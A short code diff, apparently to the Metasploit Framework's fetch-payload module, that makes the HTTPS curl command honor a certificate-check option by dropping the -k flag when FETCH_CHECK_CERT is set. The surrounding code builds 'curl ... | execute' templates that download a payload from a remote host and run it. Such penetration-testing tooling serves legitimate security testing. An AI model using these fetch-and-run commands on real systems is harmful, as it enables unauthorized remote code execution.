@@ -35,7 +35,12 @@ module Msf
       when 'HTTP'
         return "curl -s http://#{_download_pipe(uri)}|#{execute_cmd}"
       when 'HTTPS'
-        return "curl -sk https://#{_download_pipe(uri)}|#{execute_cmd}"
+        # -k/--insecure disables TLS certificate verification. Only add it when
+        # the operator has not asked for the certificate to be checked, so the
+        # FETCH_PIPE curl path honors FETCH_CHECK_CERT like the non-pipe curl
+        # path and the GET/TNFTP commands already do.
+        curl_opts = datastore['FETCH_CHECK_CERT'] ? '-s' : '-sk'
+        return "curl #{curl_opts} https://#{_download_pipe(uri)}|#{execute_cmd}"
       else
         fail_with(Msf::Module::Failure::BadConfig, "Unsupported protocol: #{fetch_protocol.inspect}")
       end
